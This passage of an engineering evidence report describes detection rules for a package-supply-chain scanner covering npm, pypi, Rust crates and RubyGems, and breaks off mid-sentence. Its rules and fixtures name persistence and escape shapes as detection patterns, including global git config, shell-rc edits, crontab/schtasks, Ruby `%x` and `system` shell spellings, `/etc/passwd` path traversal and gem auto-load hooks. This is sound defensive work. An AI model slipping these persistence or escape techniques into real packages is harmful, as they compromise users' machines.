`/(?:git\s+config\s+--global|--global["']\s*,|["']\.gitconfig["'])/` — R2's closed list must carry
BOTH the shell-text and argv-token forms for every command family (same trap applies to T4/cross-manager).

### §4.1 gitleaks cross-check (plan unknown #2)

`gitleaks 8.30.1` (`/home/lab/.local/bin/gitleaks`) run over the planted corpus (all T2/T3/T4/
cross-manager files):

```
timeout 120 gitleaks detect --no-git --source planted/T4-unix --report-format json --report-path gitleaks-t4unix.json   → exit 0, log: "no leaks found", 3-byte report = `[]` → 0 findings
timeout 120 gitleaks detect --no-git --source planted --report-format json --report-path gitleaks-planted-all.json      → exit 0, "no leaks found", 0 findings
```

**Answer: gitleaks does NOT already emit on any of these strings** (static literals like `crontab`,
`schtasks`, `.bashrc` are not secret shapes). No double-report risk; the residue-* native rules own
these families and the `engine` column distinction is theoretical for now.

---

## §5 Waiver-shape reference — the blessed `# BEGIN <id>` block (plan R1(e))

Source (READ-ONLY): `/home/lab/workspace/harness/hr/hr/setup_env.py` (304 lines; byte-pinned copy at
`.omo/evidence/residue-spike/hr-setup-env.py.reference`, sha256
`0bd0c05dd90d6831a58410d1f8203c8d645775959602d53005e1104a5990a70a`) + CLI surface
`/home/lab/workspace/harness/hr/hr/cli_setup.py`. Windows-registry half corroborated by the
paired-device incident record `border/.omo/evidence/aihr-windows-install-diagnosis.md` (L25:
`reg query HKCU\Environment /v Path` on the device — HKCU scope genuinely needed, waiver correct).

### §5.1 The concrete shape, codified (file:line anchors, setup_env.py)

| Contract element | Anchor | Literal / behavior |
|---|---|---|
| Marker pair | `:34-35` | `MARK_BEGIN = "# BEGIN aihr PATH (hr setup)"`, `MARK_END = "# END aihr PATH (hr setup)"` |
| rc candidate list | `:36` | `_RC_CANDIDATES = (".zshrc", ".bashrc", ".profile", ".bash_profile")` — appended to **existing** files only (`:127-128`), POSIX order |
| Block shape | `:114-122` | BEGIN line, `case ":$PATH:" in *":<dir>:"*) ;;` idempotence guard, `*) export PATH="<dir>:$PATH";;`, `esac`, END line |
| Byte-reversibility | `:6-7` (docstring), `:140-141` (idempotent skip-if-present), `:160` `text.replace(block, "", 1)` | removal deletes EXACTLY the written block, first occurrence, nothing else |
| Sole-created-file rule | `:18-19` docstring, `:128` fallback `[home / ".profile"]`, `:136-138` create-empty, `:164-168` delete-if-left-empty | `~/.profile` is the ONLY file the module may CREATE, and `remove_posix` un-creates it when emptied |
| Windows scope | `:239-245` | `OpenKey(HKEY_CURRENT_USER, "Environment", KEY_QUERY_VALUE|KEY_SET_VALUE)` — user-scope, never HKLM/elevated (docstring `:9-14`) |
| REG_EXPAND_SZ preservation | `:216-224` (read keeps `value_type`; missing Path ⇒ default `REG_EXPAND_SZ`), `:227-236` (`safe_type` ∈ {REG_SZ, REG_EXPAND_SZ}; comment `:228` "Expandable type keeps %VAR% entries written by other tools alive") | foreign `%USERPROFILE%` entries survive verbatim |
| WM_SETTINGCHANGE broadcast | `:248-275` | `SendMessageTimeoutW(0xFFFF, 0x001A, 0, "Environment", 0x0002, 5000, …)`; best-effort — `except Exception: pass` `:274-275` |
| OS dispatch | `:283-304` | `persist_path`/`remove_path` = one write-primitive + its exact inverse, injectable seams (`platform/home/environ/reg_mod` docstring `:21-23`) |

### §5.2 CLI inverse surface (`cli_setup.py`)

| Element | Anchor | Evidence |
|---|---|---|
| `--uninstall` flag | `:295-304` | `typer.Option(... "--uninstall", help="Remove everything setup/installers added (configs, npm globals, cache copies, PATH entries, skill/agent copies). The engine wheel itself: pip uninstall aihr.")` → `raise typer.Exit(code=run_uninstall())` |
| Inverse chain | `:186-233` | `run_uninstall` calls `[registrar, "uninstall"]` (`:205`), `_npm_argv("uninstall")` (`:210`), then PRINTS (never runs) third-party removals: fastdraw `uninstall.sh` line (`:232`) and `:233` `say("last step (yours): remove the engine itself with: pip uninstall aihr")` — **prints-never-runs** |
| PATH step tied to inverse | `:136-154` | `ensure_script_on_path` docstring "every write undone by `--uninstall`"; when it cannot act it only PRINTS guidance (`:154`) |

### §5.3 Frozen generic marker grammar (B2 detection vocabulary — plan amendment D3)

```
begin-line := "#" SP id-path SP "(" note ")"?   ; hr:  "# BEGIN aihr PATH (hr setup)"
end-line   := "#" SP id-path SP ("(" note ")")? ; MUST repeat the same id-path BYTES
id-path    := token (SP token)*                 ; token = [A-Za-z0-9][A-Za-z0-9._-]*  (kebab/snake/dotted)
block      := begin-line NL { any-line } end-line   ; contiguous, NOT nested; unique (file,id)
```

- `<id>` charset: 1–4 space-separated tokens, each matching `[A-Za-z0-9][A-Za-z0-9._-]{0,63}`
  (covers `aihr PATH`; kebab/snake/dot only; no regex metacharacters — matcher builds literals, never
  user-derived patterns; whole id-path+note ≤ 120 chars). The optional parenthetical is a
  provenance note (who wrote it), not part of the id; pairing matches on the id-path bytes.
- Detection = THREE static conditions (B2, 0.3.0, detection-only — plan amendment 2026-09-08):
  - **(i) write-path**: the artifact contains a marker-INSERTION literal — a string constant of the
    shape `# BEGIN <id>` (single-quoted or template) reaching a write/append call
    (`write_text|writeFileSync|append*|open(...,"a")|Add-Content|echo >>`).
  - **(ii) remove-path**: the SAME `<id>` (or the marker constant's name via one assignment hop,
    e.g. `MARK_BEGIN`) appears in a deletion/restore path (`replace(block,"")`, `write_text(text
    minus block)`, `sed -i '/BEGIN .../,/END .../d'`, `DeleteValue`, file-unlink of sole-created
    target).
  - **(iii) CLI inverse surface**: an `--uninstall`/`uninstall`/`remove` verb is reachable from a
    `console_scripts` entry-point or package `bin` (import/definition graph depth ≤ 2 from the entry
    to the remove-path function — here: `setup(:303) → run_uninstall → remove_path/remove_posix`).
- **(k) trio expectations** (plan corpus item (k); what R2 must emit for each fixture):
  | Fixture | Condition result | Finding rows |
  |---|---|---|
  | paired (setup_env.py shape: (i)+(ii)+(iii) all true) | pairing **verified** | T3 HIGH `residue-out-of-tree-write` + `pairing=verified` annotation; severity STAYS HIGH in 0.3.0 (no downgrade ≤0.3.0 — plan Must-NOT) |
  | write-orphan (writes `# BEGIN foo` with no remove-path anywhere) | (i) true, (ii)/(iii) false | T3 HIGH **plus** extra HIGH `residue-pairing-missing` NAMING the orphaned `<id>` (`foo`) |
  | remove-orphan (removes `# BEGIN bar` block it never writes) | (ii) true, (i) false | MEDIUM note (reverse of G15 asymmetry; residual-undo-only is suspicious, not blocking) |

---

## §6 Open questions / contradictions found by the anatomy

1. **Plan T1 prose says "no network" but the BLESSED shape HAS a conditional network fallback.**
   opencode `installPackage` (postinstall.mjs L126-144) spawns `npm install … --prefix <mkdtemp>` ⇒
   registry traffic + temp writes, and `verifyBinary` (L158-165) EXECUTES the binary it just placed.
   Signature #1 must therefore either (a) encode the exact fallback argv literals of clause 4+5
   (recommended — keeps the table a literal-signature), or (b) the golden fixture can never reach T1.
   This is a decision R2 must make explicit in the classifier's docstring; the contract freezes the
   argv so either choice is mechanical.
2. **Import-allowlist gap**: plan names {fs, os, path, child_process, module}; the live file also
   imports `url` (fileURLToPath — line L8). §1.6-2 adds it; plan wording should be read as amended.
3. **child_process argv0 set is wider than "sysctl/registry probe"**: live script spawns
   `sysctl`, `ldd`, 4 powershell variants, `npm`, and its own placed binary. §1.6-4 freezes the exact
   list; the plan's parenthetical ("sysctl/registry-probe allowlist") is under-specified — implement
   from §1.6, not the plan's shorthand.
4. **Hook grammar breadth**: real corpus shows `node install.js` (no `./`, CJS) and bare-bin hooks.
   §1.6-1 keeps T1 at the exact `node ./<name>.mjs` shape for 0.3.0; widening is a later-signature
   decision (and esbuild's presence proves widening must re-check T2 literals, not just grammar).
5. **publint noise on the byte-honest golden fixture**: §3.2 P5 — decide whether golden (a) asserts
   only the `lifecycle-script`/`residue-in-tree-hook` row, or ships a stub `bin/opencode.exe` in the
   fixture (stub breaks "byte-identical copy" purity). Recommended: scope the assertion.
6. **Strict 0.2.0 config schema** (dirty tree): even direct stage calls need a full border.yaml
   (`version`, `targets.git.remotes`, `rules.{authors,hosts,ips,pathPatterns}`, `allow`, `engines`)
   — R2's fixture helper should reuse §3.1's cfg string verbatim.
7. **argv-token vs shell-text shapes**: every command-family pattern needs both forms (§4 lesson,
   `t3-git-global` initial miss).
8. **No contradictions found on**: rc grep-zero (T0 claim holds, §1.5), hardlink proof (link 2, same
   inode + same sha256, §1.4), gitleaks non-overlap (§4.1), `private:false` npm manifest, and the
   lifecycle-row blast-radius claim (all §2 samples + synthetic DO report today, §3).

---

## §7 Evidence inventory & reproducibility

Everything in `.omo/evidence/residue-spike/` (manifest: `SHA256SUMS.manifest` —
`find . -type f -print0 | sort -z | xargs -0 sha256sum > SHA256SUMS.manifest`):
`fixtures/<5>` (+ their `.border/dist/*.tgz` proving the recorded sha256s), `planted/<9 dirs>`,
`spike-runner-inner.ts` + `run-spike.mjs` (§3.1 — rerun to regenerate `stage-pins-0.2.0.json` and
diff against the pinned copy), `pattern-proto.mjs` → `pattern-proto-results.json` (§4),
`gitleaks-*.json/.log` (§4.1), `hr-setup-env.py.reference`, `stage-pins-stderr.log`.
R1 executed ZERO third-party lifecycle code (all hooks were pattern-matched as text; `npm pack` ran
with `--ignore-scripts`; no installs anywhere).

---

## §8 R3a amendment (2026-09-08, plan border-residue-gate R3a) — pypi + crates legs

Dated post-freeze amendment (same register as §5.3 D3). Doctrine is the npm leg's, transplanted:
every rule-id/pattern string lives in `src/rules/residueMatchers.ts`; unknown shapes never widen;
pre-R3a stage rows pass through byte-compatibly (characterization pins: clean sdist+wheel and
clean OUT_DIR-confined crate emit ZERO findings before and after the leg).

**pypi (no T1 pass-lane, plan §57).** Scan set = `setup.py` whole + `pyproject.toml`
`[build-system]` section ONLY (a whole-manifest scan would false-positive on runtime
`[project].dependencies` — pinned silent by R3a-E's control). Families: existing table plus
`t3-py-expanduser` (user-home resolution is out-of-tree posture). Artifact-wide T4 over every
sweepable packed file, in BOTH trees (a primitive string in a module ships twice: sdist and wheel
— per-archive attribution makes both visible). Rows attribute `<archive>!<inner>` (plan R3a AC).
Residual limitations (honest): (a) setuptools executes setup.py during `python3 -m build` — that
execution risk is pre-R3a, documented, and unchanged (plan §"setup.py scan overlaps"); (b) cmdclass
bodies imported from OTHER modules are out of the one-hop grammar exactly like npm clause 8; (c) a
custom `[build-system].backend` name is not itself matched, and its module code is NOT scanned by
the T2/T3/xmgr families — those stay confined to `setup.py` + `[build-system]` per plan scope (no
scan-set broadening in R3a; widening is an R4-candidate). A custom backend therefore enters
detection ONLY via T4 persistence tokens wherever they appear in the sdist (artifact-wide sweep),
so a backend whose code names no enumerated token stays fail-OPEN under the identical §1.6-9
residual (reworded 2026-09-09 per VERIFIER-REPORT-R3A V2: the pre-wording "its code only enters
scope through the same closed families" overclaimed — probes P3/P3b show only the T4 lane fires);
(d) `t3-py-expanduser` matches the `expanduser`/`Path.home` call shapes only — HOME resolved
indirectly (`os.environ["HOME"]`, `os.path.expandvars`) is a known blind spot (VERIFIER-REPORT-R3A
N3, probe P1b): plan-conformant, since plan §57 enumerates the expanduser-shape writes; routed to
the §1.6-9 obfuscation lane, never a basis for widening the pattern silently.

**crates (no T1 pass-lane either).** `build.rs` gets the full family scan (Rust wording:
`build-script code … outside the cargo ledger`) plus §57 write-confinement: every
`fs::write(`/`File::create(` first argument must make a LIVE env-reference call —
`env::var("OUT_DIR")` / `env::var("CARGO_TARGET_TMPDIR")`, optional `std::` prefix — or
resolve by bounded chain-head walking (`.method(..)` receivers, `Type::assoc(..)`/macro first
arguments) to an identifier whose EVERY assignment — `let [mut] id =` AND bare `id =` (R3a fix
round 2026-09-09 per VERIFIER-REPORT-R3A V1; the pre-fix `let`-only scan let a bare rebind escape
fail-OPEN) — makes such a call itself or resolves the same way, cycle-guarded; unknown
head, no binding, or unparseable argument ⇒ row (fail closed, R3a-F). Shape-bound recognition is
the R3a fix round 3 (2026-09-09, VERIFIER-REPORT-R3A-FIX blocker R3AFIX-F1): the pre-fix test was a
substring scan, so `fs::write("/usr/local/bin/OUT_DIR", …)` read as confined fail-OPEN; the doctrine
is that in Rust these roots are legitimately reachable ONLY through env::var-family calls, so the
call syntax is the only acceptance form — the `envRefCall` scanner skips `"` strings, `r#"…"#` raw
strings, line comments, and block comments AT THEIR TRUE NESTED EXTENT — Rust nests block comments
(Rust Reference: two `/*` openers need two closers), so the skip counts depth (fix round 4
2026-09-09, VERIFIER-REPORT-R3A-FIX3 blocker R3AFIX3-B1: the pre-fix flat closer search ended a
comment at the inner `*/` and resurrected a commented-out `env::var("OUT_DIR")` as live code — a
token-in-comment that CONFINED, fail-OPEN of the F1 class; pinned R3a-C10a/b) — meaning the token
cannot match from literal/comment text (`format!("{}/OUT_DIR_cache", env::var("HOME")…)` ⇒ row,
pinned R3a-C9 k1/k2/k3). Exotic indirection that carries the root another way (`env!("OUT_DIR")`,
`const ROOT: &str = …` aliases) ⇒ violation row: the deliberate fail-CLOSED side of the adjudication
— exotic indirection costs the build a row, never a silent pass; the same holds for exotic SPELLINGS
of the real call the scanner cannot see (`env::var(r"OUT_DIR")`, `env::var(/* c */ "OUT_DIR")`)
(round-4 nit N2, fail-closed side, pinned by probe). The idiomatic
`fs::write(PathBuf::from(&out_dir).join("generated.txt"), ..)` shape resolves confined ⇒ zero rows
(N1 false-positive fixed without weakening the ALL-bindings rule; verifier probe C4 pinned as
R3a-C4, the V1 bypass as R3a-C8). `Cargo.toml` network-crate detection is
scoped to `[build-dependencies]` / `[target.*.build-dependencies]` section bodies — runtime
`[dependencies] reqwest` is T0 negative space (plan §56, pinned by R3a-D's control).
Residual limitations: the §57 verb set is exactly {fs::write, File::create} (`OpenOptions`,
`create_dir_all`, `std::fs::rename` etc. are OUT of the closed set — plan text governs; widening
requires a plan amendment, not a matcher edit); the rebinding hop is textual and catches `let`
shadowing/redeclaration AND bare `id =` assignment (VERIFIER-REPORT-R3A V1 — the pre-fix
`let`-only scan missed `o = format!(…, env::var("HOME")…)` after a confined `let mut o`; the
bare-assignment arm excludes comparison operators lexically), with every recorded RHS subject to
the ALL-bindings rule. Shapes still beyond the matcher, all routed to the named §1.6-9 lane
(fail-open where they hide, fail-closed where they mis-resolve — the badge is the price, never
the safety), each re-probed against code reality in fix round 3 (2026-09-09): INVISIBLE (no row —
escape side, named so nobody mistakes silence for detection): in-place mutation of a confined
identifier without assignment — `o.push_str(..)` AND `o += ".."` alike (N-a: an earlier code comment
listed `+=` among violation shapes; it is not — `+` breaks the `\w+\s*=` adjacency of ASSIGN_SHAPE,
the op records no binding, and only this §8 class line governs it); lexical path traversal away from
a confined origin (`env::var("OUT_DIR").unwrap() + "/../../etc/passwd"`) — the matcher verifies the
root's origin, never normalizes the path; ORIGIN-ONLY confinement by the same doctrine covers the
root-literal-first spelling `format!("/usr/local/{}", env::var("OUT_DIR").unwrap())` — a live env call
IS present so the write resolves confined even though the literal root /usr/local discards the root
value (round-4 nit N1, named so nobody reads the silence as a bug — same §1.6-9 family as lexical
traversal). FAIL-CLOSED (row — false-alarm side): tuple destructuring
`let (o, _) = …` records no plain `o =` assignment, so the head is unbound ⇒ row (N-b probe
2026-09-09); self-refining rebind chains (`let o = PathBuf::from(&o)` — the ALL rule reads the
refining RHS, whose head is `o` itself, as unconfined ⇒ deliberate fail-closed row); assignment
slices truncated mid-chain (dangling trailing `.`) or any unparseable head ⇒ row; `format!`
interpolation that never makes the env call (`format!("{o}/…")`, `format!("{}/OUT_DIR_cache",
env::var("HOME")…)`) ⇒ row (R3a-C9). CORRECTED this round: multi-line fluent chains are NOT a
blanket escape — a complete multi-line binding (`let o = Path::new(\n env::var("OUT_DIR").unwrap(),\n
).join(\n "gen.txt",\n)`, dot-lead receiver splits) parses and resolves confined (probed zero); only
the truncation/dangling shapes above row. Quote- and comment-parity mis-parses (char literal holding
`"`, odd quotes, unbalanced comment openers) can only hide a real call from `envRefCall`, never
fabricate one — B1's comment-parity revive was precisely the fabrication case this claim denied, and
the depth-tracking skip closed it (round 4): mis-parse ⇒ row, the fail-closed direction by
construction. The verifier's own
C6/C7 findings stand: OpenOptions silence and the build-deps-only network scope are plan-text
positions, not matcher bugs.

**Message wording parameterization.** `familyHits` takes `{what, ledger}` (FAMILY_WORDING:
npm `lifecycle`/`npm` — byte-identical to 0.2.0, legs use `build-hook`/`pip` and
`build-script`/`cargo`). `residueFindings` gained `sep?` (default `/` = npm `package/<rel>`;
`!` = pypi `<archive>!<inner>`; `root:""` = crates inner rel). Both defaults preserve the npm
row shape byte-for-byte (R2-PIN + 21/21 green).

**npm digest-dump canonicalization (N-c lock, fix round 3 2026-09-09).** The reproducible recipe for
the npm-leg digest evidence: stage the 14 npm corpus fixtures in alphabetical order through
`runNpmArtifactStage` with the R2 test CFG (skipGitleaks/skipSecretlint, no engine legs), keep rows
with `rule.startsWith("residue-")` (11 rows: 10 `residueFindings`-keyed + 1 T1-badge row), and
concatenate their `valueDigest` hex strings in stage-emission order joined by a single `"\n"` with NO
trailing newline; `sha256` of that UTF-8 string =
`cf54bc25bf5fc9552dfd048e04297cec14af178dc3ef44767b4cf74526cdb08d` (for this row set, natural order
coincides with sorted-digest order — both give the same sha). The prior round's claim sha
`d94ca91c2b2e46bd63d720f3def2dc1638f6b8f693ba794435ec42ffff7a6c63` is **not reproducible from disk
evidence**: that dump script was never persisted and ~500 reconstructed recipe variants (fixture /
row-order permutations, separator and column layouts, identity prefixes, JSON shapes, trailing-
newline states) all mismatch — recorded honestly, not faked. The substantive claim it carried (the
`patternId` digest suffix leaves every npm row digest byte-identical) stands independently on the
verifier's row-level recompute (11/11 byte-exact under the pre-fix key) and on the R3a fix-round-2/3
npm 21/21 green pins. Script + row set stored at `.omo/evidence/residue-spike/npm-digest-dump.mts` /
`npm-digest-rows.json` so future rounds re-run THE recipe, not a paraphrase.

---

## §8 R3b amendment (2026-09-09, plan border-residue-gate R3b) — rubygems leg

Dated post-freeze amendment (same register as the R3a round). Doctrine transplanted from the crates
leg: a dedicated per-family module (`src/artifacts/residueGem.ts`, template `residueRust.ts`),
closed gem tables APPENDED to `src/rules/residueMatchers.ts` (the single home), `residue.ts`
consumed read-only. The stage merge is ADDITIVE: rows from gitleaks (native `data.tar.gz!…`
descent) and secretlint emit before the leg block and are byte-untouched; a non-gem-layout
container (no `metadata.gz`/`data.tar.gz` members) skips the leg entirely — pre-R3b behavior,
which is why the scripted-fake-gem tests in `test/channels.rubygems.test.ts` pass unchanged. Rows
attribute `data.tar.gz!<inner>` (mirroring gitleaks' §d shape; identity = the built
`<name>-<version>.gem` file). The inner data tree extracts to a SIBLING sandbox (`<extractDir>-data`,
OUTSIDE `extractDir`) — extracting inside would duplicate gitleaks' own native inner-archive scan
(contract §d double-scan trap); both sandboxes are removed in the same finally.

**Unmatchable extension (plan R3b AC: "exactly one MEDIUM note, never silent clean").** The
extension list is parsed from gunzipped `metadata.gz` YAML (gem 3.6.7 measured shapes:
`extensions: []` pure-ruby; block sequence `- ext/foo/extconf.rb` otherwise; flow `["a","b"]`
tolerated). Each declared entry — an `…/extconf.rb` path or an extension dir whose `/extconf.rb`
is implied — with no matching file in data.tar.gz yields EXACTLY ONE MEDIUM row under
`residue-gem-unmatched-extension`, a NEW closed id appended to the single home (plan-deviation,
recorded in the R3b DoneClaim: no existing family id carries declared-but-unshipped-build
semantics — T1 is the in-tree-hook badge, PAIRING the B2 marker lane). Duplicate declarations
resolving to one missing extconf collapse to one note (never extra rows for the same miss);
`extensions: []` or an absent key is T0 silent (pure-ruby golden pinned R3b-PIN). Block-seq
truth (BLK-3 fix, VERIFIER-REPORT-R3B: the original loop `break`-ed on any non-item line, so
`extensions:\n# packaged by tool\n- ext/ghost/extconf.rb` declared NOTHING and a declared-but-missing
build silent-passed — a plan-AC violation): YAML comments do NOT terminate sequences, so blank and
comment lines are skipped and collection CONTINUES; the region ends legitimately only at the next
top-level mapping key or EOF, and an `extensions:` followed by nothing but blanks/comments/whitespace
is YAML null ⇒ zero declarations, legitimately (pinned R3b-G5). A declaration shape the closed
grammar cannot read — any other line inside the region (e.g. an indented nested mapping) — or an
ungunzip-able `metadata.gz`, is an EngineRunError (border exit 2), never a silent clean (pinned
R3b-G3/G4/G6). The indented-`extensions:`-inside-a-block-region shape (`extensions:\n- ext/a/extconf.rb\n  extensions: nested`)
is exactly such an unrecognized line: the indentation makes it neither a sequence item nor the column-0
terminator, so it THROWS the same gate stop rather than being skipped (BLK-R3bF2 NIT-3; re-verified on
the unit path 2026-09-09). The flow spelling `extensions: []` never opens a block region, so an indented
head after it is not read by the closed parser at all — but psych rejects that document upstream
(`Psych::SyntaxError`, box-verified 2026-09-09), so there is no silent-certify path there either. Duplicate-key truth
(BLK-7 fix, VERIFIER-REPORT-R3B-FIX: the single-key read was
FIRST-wins while psych/rubygems resolve duplicate YAML keys LAST-wins — box-measured 2026-09-09 —
so a crafted container pairing `extensions: []` (first) with a real block-seq (second) silently
declared NOTHING while the real `gem install` BUILDS the shipped-nowhere extension; the reverse order
previously over-rowed one safe-side MEDIUM): the scan counts EVERY column-0 `extensions:` occurrence
(flow and block heads alike) and MORE THAN ONE — in either order — THROWS
`duplicate extensions: key — cannot certify` before parsing either side; the stage wraps it into an
EngineRunError (gate stop, exit 2), so neither order can ever be silent-clean nor selectively
certified (pinned R3b-G7 unit both orders + R3b-G8 stage; the verifier a5-dupkey payload reproduces
`duplicate extensions: key (2 top-level declarations)`). `files:` gets NO twin guard by adjudication:
this leg never reads `files:` — every data-side fact comes from the actual `data.tar.gz` member
listing, so a duplicate `files:` key has no first/last-wins hazard to fail closed on. Real
`gem build` HARD-REFUSES missing extension files
(`"ext/ghost/extconf.rb" are not files`, probe 2026-09-09), so the mismatch shape can only arrive
through third-party tooling or repacks — and the fixture (R3b-G/G2/G3/G8) is hand-assembled with
tar+gzip behind the scripted fake-gem seam on exactly that premise.

**T4 (CRITICAL) — the gem-world lifecycle-hook analog, strictly worse.** A file named
`rubygems_plugin.rb` ANYWHERE in the data tree is auto-loaded by RubyGems into every later
`gem`/`ruby` process after install ⇒ `residue-persistence-primitive` CRITICAL (patternId
`gem-autoload-plugin`). `Gem.post_install|post_uninstall|pre_install` registration in any readable
packed file (not only auto-loaded ones — the plan says "anywhere in the .rb content") is the same
CRITICAL family (patternId `gem-hook-token`); a file that is both collapses to ONE row (plugin
outranks the token, pinned R3b-B). The closed grammar accepts BOTH separators `.` and `::`
(BLK-1 fix: `Gem::post_install { … }` is the static-call spelling and registers a LIVE hook —
measured on box ruby 3.3.8, `Gem.post_install_hooks` 0→1 — so it is NOT the dynamic-dispatch
invisible lane; pinned R3b-B3). NIT-2 adjudicated as a VERIFIED NON-FINDING, no widening: the
comment-split `Gem.post_ ## x\ninstall { … }` is inert Ruby — box-reconfirmed 2026-09-09 with
`undefined method 'post_' for module Gem (NoMethodError)` — nothing registers, nothing rows. PatternIds keep same-(rule,file) lanes independently
allow-listable (R3A-N2 digest doctrine), as does `gem-confinement` on T3 rows. The artifact-wide
`t4HitFor` sweep over every readable packed file is unchanged from R3a and rows even at-rest lib
files (pinned R3b-H).

**Reachability decision (plan R3b (d)/(f)).** The family scan (wording `{what: "gem install-time",
ledger: "gem"}` — a custom literal passed to `familyHits`, FAMILY_WORDING and residue.ts untouched)
covers extconf.rb — any file with that basename, declared or not, since the installer executes it
during the native build — ∪ plugin-named files ∪ hook-token-bearing files. Rakefile/lib/bin at rest
get ONLY the artifact-wide T4 sweep and the hook-token lane, never the T2/T3/xmgr families: gem
install never runs them. This is installer semantics, not ambiguity, so no fail-closed widening was
needed; cross-manager rows therefore fire for e.g. `system("npm install -g …")` inside an extconf
(pinned R3b-E) while a prose `gem install acme` line in an unread lib stays T0.

**extconf write-confinement (plan R3b (a); no T1 lane — nothing in extconf is
confinement-legitimate except staging inside the extension build tree).** Closed verb table
`GEM_WRITE_CALL` (roster completed by the ROUND-8 family sweep below): `File.open|binwrite|write|sysopen|touch|link|symlink|rename|unlink|delete|truncate|chmod|lchmod|chown|lchown|utime|mkfifo`,
`FileUtils.*`, `Dir.mkdir|rmdir`, `IO.popen|sysopen|write|binwrite|copy_stream`, `Open3.*`,
`Process.spawn`, the fixed-receiver fd-hijack arm `$stdout|$stderr|$stdin|STDOUT|STDERR|STDIN`
`.reopen` (either separator), bare `system|spawn|exec|popen` with
paren, quote OR PERCENT operand, `%x` and the backtick. The percent operand is the BLK-R3bF4-B
widen (VERIFIER-REPORT-R3B-FIX3): box ruby 3.3.8 executes `system %q{/usr/local/bin/x}`, `exec %q{…}`
and `system %{touch /tmp/y}` live (verifier payloads i4_pctq/i4b_pctbrace; liveness re-proved 2026-09-09,
files created, `%{…}` evaluating as the string argv) while the old paren-or-quote-only class silent-passed
them; gemVerbSpan normalizes the paren-less percent operand to the QUOTED PAYLOAD (designator letters skipped, closer resolved through
the same GEM_PERCENT_PAIRS table as `%q`/`%x`) and judges it through the SAME mark/expansion path the
parened form already uses — pinned R3b-C12a/C12b. BLK-R3bF5-A (VERIFIER-REPORT-R3B-FIX4) closed the
delimiter-and-designator gap the prefix-inclusive span had left: box ruby 3.3.8 executes `system %x|/usr/local/bin/x|`,
`system %x!/usr/local/bin/x!`, `system %x%/usr/local/bin/x%`, `system %x@/usr/local/bin/x@` (markers live_a…live_d,
re-proved 2026-09-09), `system %w|/usr/local/bin/x y|` (the 2-element `[cmd, argv0]` array spelling — 1- and
3-element arrays raise `wrong first argument`, box-measured; rooted-command marker exec live_w) and the
designator-less `system %|/bin/true|` ⇒ true, yet the old span carried the `%x<delim>` prefix past the ROOTED
`^`-anchor while its `%` match also prevented the dedicated %x arm from re-firing on that text ⇒ 0 rows. The
span is now `"payload"` — byte-identical to what the %q/%Q expansion produced from the full literal — so exactly
ONE percent-expansion path remains (pinned R3b-C13a…C13e; fresh probes 1/1/1/1/1/1, parened twin `system(%x|…|)` 1). The widen is operand-shaped, not verb-shaped: a RELATIVE
percent operand stays confined (`system %q{make clean}` probes row count 0, FP guard pinned R3b-C12c) and
the lookbehind still refuses `system` inside an identifier (`microsystem %q{/usr/local/bin/x}` probes 0).
`Process.spawn` is an EXPLICIT receiver arm
(BLK-R3bF2-B, VERIFIER-REPORT-R3B-FIX2: the dotted-canonical spelling matched nothing — the bare arm's
lookbehind refuses the `.`, and `Process` had no receiver arm — while box ruby 3.3.8 executes it live;
the arm precedes the bare verbs so `Process::spawn` and `Process.spawn` each consume exactly one match
and pay EXACTLY one row, never a double count (pinned R3b-C9d/C9e)). Every dotted alternative — and the
`Dir.chdir` lane — accepts BOTH separators `.` and `::` with arbitrary surrounding whitespace (BLK-5 fix, VERIFIER-REPORT-R3B-FIX: `File::write`,
`FileUtils::cp`, `Dir::mkdir`, `IO::popen`, `Open3::pipeline_rw`, `Dir::chdir` are the static-call
spellings and execute identically on box ruby 3.3.8 — probe 2026-09-09 — so per the BLK-1 precedent
they cost a row, not a silent pass; pinned R3b-B4 (spaced `File :: write`) + C7a-d). The bare-verb
arm's lookbehind deliberately excludes only `[\w.]`, which is the DOCUMENTED design by which
`Kernel::system`/`Kernel::spawn` rows through the bare lane (`:` is neither — pinned R3b-C7e, which
now passes by table design, not by the accidental fallback the verifier observed); the same `.`-class
refusal is why the DOT-receiver form `Kernel.system %q{/usr/x}` stays silent while box-live (`Kernel.system`
itself measures `true` on box ruby 3.3.8, probe 2026-09-09) — named as invisible item (10), and the
`::`-form percent twin `Kernel::system %q{/usr/x}` re-probes row count 1. `%x` is
delimiter-GENERIC: the arm is `%x` + any non-alphanumeric, non-space character (BLK-6 fix — the
BLK-4a enumerated six `( [ { < |` were NOT the live set: box ruby 3.3.8 executed `%x!…!`, `%x~…~`,
`%x"…"`, `%x%…%` as real commands (probe 2026-09-09) while they matched no verb and silent-passed);
the closer is resolved the same way `GEM_PERCENT_PAIRS` resolves `%q` — paired for `[ { <`,
otherwise the opener char itself — mirroring the `%q`/`%Q` grammar rather than enumerating
(pinned R3b-C4b `%x!install -m 0777 build/x /usr/local/bin/!` ⇒ one HIGH, R3b-C4c `%x"…"` + `%x~…~`
⇒ two HIGH). Since BLK-R3bF5-A the bare-verb + `%x<non-pairing-delim>` spellings row too — not through
this arm (the verb match consumes their `%` first) but through the percent branch's quoted-payload
normalization above, one path for every designator (pinned R3b-C13a…C13d). Read-only mkmf hints (dir_config / have_header / have_library / create_makefile) are
deliberately OUT — they probe or edit the in-tree Makefile only (real-extconf probe 2026-09-09;
create_makefile's argument is an extension name, never a filesystem path). Confinement is by
ABSENCE over the WHOLE argument list of a call — not just its first comma-separated argument
(BLK-5 parity: `FileUtils.cp("build/a", "/usr/local/bin/a")` escapes through its DESTINATION
operand and silent-passed under first-arg-only reading; a rooted literal in ANY argument position
now rows, dot- or `::`-form, pinned R3b-C7b; probe caught-fwdot-cp 1 HIGH) — so a verb span
containing `$HOME`/`Dir.home`-or-`Dir::home`/any ENV lookup (`ENV[`, `ENV.`, `ENV::[]`, `ENV::fetch`)/`~/`
— the marks are REGEXES with both separators since BLK-R3bF2-A (VERIFIER-REPORT-R3B-FIX2: the plain-
substring table was DOT-ONLY, so the box-live colon spellings `Dir::home`, `ENV::[]("HOME")` and
`ENV::fetch` silent-passed — the `::`-normalized-everywhere meta-lesson applied to the mark lane;
`ENV::fetch` now rows via THIS T3 mark lane itself, no longer depending on the npm fetch( pattern
collateral that happened to catch it, pinned R3b-C9a…C9c) — or a string literal ROOTED at a slash
(`GEM_ABSOLUTE_LITERAL` is quote-then-slash only, so a `"https://host/x"` argv — curl|sh —
is T2 territory and never a spurious T3, pinned R3b-D), or a slash-rooted BARE shell token
(`GEM_ROOTED_SLASH_ARG`: start-, whitespace- OR opening-bracket-adjacent `/` followed by a path char —
the boundary class is EXACTLY `[\s(\[{<]`, i.e. only OPENING delimiters: CLOSING delimiters,
